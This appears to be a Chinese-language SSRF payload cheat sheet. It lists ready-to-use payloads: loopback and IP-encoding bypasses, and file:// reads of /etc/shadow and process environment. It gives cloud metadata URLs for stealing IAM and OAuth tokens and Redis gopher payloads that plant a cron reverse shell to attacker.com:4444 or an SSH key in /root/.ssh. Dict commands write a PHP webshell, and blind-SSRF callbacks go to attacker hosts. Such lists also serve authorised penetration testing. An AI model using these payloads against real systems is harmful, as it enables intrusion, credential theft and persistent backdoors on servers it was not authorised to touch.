# SSRF Payload 模板

## 基础检测

### 内网 IP 访问

```
# 本地回环
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://[::1]
http://[::1]:80
http://0.0.0.0
http://0x7f000001
http://0x7f.0x00.0x00.0x01
http://0177.0.0.1
http://017700000001
http://0177.0.0.1

# 内网 IP
http://192.168.1.1
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
http://172.17.0.1
http://172.18.0.1
http://172.19.0.1
http://172.20.0.1
http://172.21.0.1
http://172.22.0.1
http://172.23.0.1
http://172.24.0.1
http://172.25.0.1
http://172.26.0.1
http://172.27.0.1
http://172.28.0.1
http://172.29.0.1
http://172.30.0.1
http://172.31.0.1
```

### 协议利用

```
# file 协议
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd
file:///proc/self/fd/0
file:///proc/self/fd/1
file:///proc/self/fd/2
file:///var/log/apache2/access.log
file:///var/log/nginx/access.log

# dict 协议
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys:*
dict://127.0.0.1:11211/stats

# gopher 协议
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# sftp 协议
sftp://attacker.com:22/

# ldap 协议
ldap://attacker.com/cn=test

# tftp 协议
tftp://attacker.com:69/test
```

## 绕过技术

### IP 格式绕过

```
# 十进制
http://2130706433
http://3232235521
http://16885952

# 八进制
http://0177.0.0.1
http://017700000001

# 十六进制
http://0x7f000001
http://0x7f.0x00.0x00.0x01

# 混合进制
http://0x7f.0.0.1
http://127.0x0.1
http://127.0.0x1

# IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0:0:0:0:0:0:0:1]
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]
http://[::ffff:7f00:1]

# IPv6 省略
http://[::127.0.0.1]
http://[0:0:0:0:0:0:127.0.0.1]

# 短格式
http://127.1
http://127.0.1
http://0
http://127.0.0.1.nip.io
```

### DNS 绕过

```
# DNS 重绑定
http://attacker.com  # 第一次解析为公网 IP，第二次解析为内网 IP

# 内网 IP 域名
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://www.127.0.0.1.xip.io
http://spoofed.burpcollaborator.net

# 短域名
http://localtest.me
http://localhost.lv
```

### URL 解析绕过

```
# @ 符号
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://attacker.com#@127.0.0.1

# # 符号
http://127.0.0.1#@attacker.com

# URL 编码
http://%31%32%37%2e%30%2e%30%2e%31
http://127%2e0%2e0%2e1
http://127%30%2e0%2e1

# 反斜杠
http://127.0.0.1\@attacker.com
http://attacker.com\@127.0.0.1

# URL 参数
http://127.0.0.1?url=attacker.com
http://attacker.com?url=http://127.0.0.1

# 重定向
http://attacker.com/redirect?url=http://127.0.0.1
http://attacker.com/redirect?url=http://169.254.169.254
```

### 协议绕过

```
# 大小写混合
File:///etc/passwd
FILE:///etc/passwd
HttP://127.0.0.1

# 协议嵌套
http://http://127.0.0.1
http:///127.0.0.1

# 协议缺失
//127.0.0.1
///127.0.0.1
```

## 云元数据访问

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# 需要 Header: Metadata-Flavor: Google
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# 需要 Header: Metadata: true
```

### Alibaba Cloud

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/hostname
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/user-data
```

### DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/dns/nameservers
```

## 内网服务探测

### 常见端口

```
# Web
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:5000
http://127.0.0.1:8000

# 数据库
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:1433
http://127.0.0.1:27017
http://127.0.0.1:6379
http://127.0.0.1:11211

# 消息队列
http://127.0.0.1:5672
http://127.0.0.1:15672
http://127.0.0.1:9092

# 服务发现
http://127.0.0.1:8500
http://127.0.0.1:2379
http://127.0.0.1:2380

# 管理接口
http://127.0.0.1:9090
http://127.0.0.1:9091
```

### Redis 攻击

```
# 写入 SSH 公钥
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$374%0d%0a%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/K9MDaOsAMT5MV0uSX/qaIK3Np0FJm6jZiR3JJKJDP3K2Xqz7Fw8LTd9MT3kXqLfxvM13vWn9S5+W5jnJLlG5iELJJuXH0i6pVpR9XhF5lWjlIsD2qRp8GFCpcJKP5YPxj+i10CVKPX1pMVLfBZfYq0VEJP6Hc5Gt0G4ypx0niPrfp0sNXJ6j6bNpGmP3LgLbvxFpVzBEVh1N0KEexGdhL5CRNQWkqIaW8aSxWvQkrSy5Xy6wsDv1RZKZjnR/sH5wjOjCdJtVqjzBGEiX9fx6xwW+5UYFwp5Yj2qE0O7G5v9iG9YQGmFyvJEThhzvlFJ0U7F7/SyL3d8MR65psfwHGma attacker@attacker.com%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 写入 WebShell
dict://127.0.0.1:6379/config:set:dir:/var/www/html
dict://127.0.0.1:6379/config:set:dbfilename:shell.php
dict://127.0.0.1:6379/set:webshell:"<?php system($_GET['cmd']); ?>"
dict://127.0.0.1:6379/save
```

## Blind SSRF 检测

```
# DNSLog 外带
http://attacker.dnslog.cn
http://127.0.0.1.attacker.dnslog.cn

# HTTP 外带
http://attacker.com/ssrf?target=http://127.0.0.1:80
http://attacker.com/ssrf?target=http://internal-server

# 时间延迟
http://127.0.0.1:80?sleep=5
```